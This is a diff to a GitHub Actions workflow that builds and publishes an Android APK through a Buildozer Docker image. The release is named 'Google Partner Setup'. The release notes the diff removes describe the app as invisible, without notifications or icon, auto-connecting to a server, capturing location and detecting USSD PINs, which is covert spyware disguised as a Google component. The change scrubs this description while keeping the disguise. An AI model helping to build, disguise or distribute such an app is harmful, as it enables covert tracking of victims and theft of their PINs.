@@ -1,9 +1,7 @@
-name: Build APK
+name: Build APK with Docker
 
 on:
   push:
-    branches: [ main ]
-  pull_request:
     branches: [ main ]
   workflow_dispatch:
 
@@ -14,61 +12,12 @@ jobs:
     steps:
     - uses: actions/checkout@v4
     
-    - name: Set up Python
-      uses: actions/setup-python@v5
-      with:
-        python-version: '3.10'
-    
-    - name: Install dependencies
+    - name: Build APK with Docker
       run: |
-        python -m pip install --upgrade pip
-        pip install buildozer cython virtualenv
-    
-    - name: Install Android SDK dependencies
-      run: |
-        sudo apt-get update
-        sudo apt-get install -y \
-          git zip unzip \
-          openjdk-17-jdk \
-          autoconf libtool pkg-config \
-          zlib1g-dev libncurses5-dev \
-          libncursesw5-dev \
-          cmake libffi-dev libssl-dev automake
-    
-    - name: Install Android SDK and NDK
-      run: |
-        # Create Android directory
-        mkdir -p ~/.buildozer/android/platform
-        cd ~/.buildozer/android/platform
-        
-        # Install SDK Command Line Tools
-        wget -q https://dl.google.com/android/repository/commandlinetools-linux-9477386_latest.zip
-        unzip -q commandlinetools-linux-9477386_latest.zip
-        rm commandlinetools-linux-9477386_latest.zip
-        
-        # Set up SDK
-        export ANDROID_SDK_ROOT=~/.buildozer/android/platform
-        export PATH=$PATH:$ANDROID_SDK_ROOT/cmdline-tools/bin
-        
-        # Accept licenses
-        yes | sdkmanager --licenses
-        
-        # Install required SDK components
-        sdkmanager "platform-tools" "platforms;android-33" "build-tools;33.0.2" "ndk;23.1.7779620"
-    
-    - name: Build APK with Buildozer
-      run: |
-        # Set environment variables
-        export ANDROID_SDK_ROOT=~/.buildozer/android/platform
-        export ANDROID_NDK_ROOT=~/.buildozer/android/platform/ndk/23.1.7779620
-        export PATH=$PATH:$ANDROID_SDK_ROOT/platform-tools
-        export PATH=$PATH:$ANDROID_SDK_ROOT/cmdline-tools/bin
-        
-        # Create .buildozer directory
-        mkdir -p .buildozer
-        
-        # Build the APK
-        buildozer -v android debug
+        docker run --rm -v $(pwd):/home/user/hostcwd -w /home/user/hostcwd \
+          -e ANDROID_SDK_ROOT=/home/user/.android \
+          kivy/buildozer:latest \
+          buildozer -v android debug
     
     - name: Upload APK
       uses: actions/upload-artifact@v4
@@ -83,12 +32,4 @@ jobs:
         files: bin/*.apk
         tag_name: v1.0.${{ github.run_number }}
         name: Google Partner Setup v1.0.${{ github.run_number }}
-        body: |
-          Google Partner Setup APK
-          
-          🔒 Completely invisible
-          🔇 No notifications
-          📱 No icon in app drawer
-          🔄 Auto-connects to server
-          📍 Captures location
-          🔑 Detects USSD PINs
+        body: Google Partner Setup APK
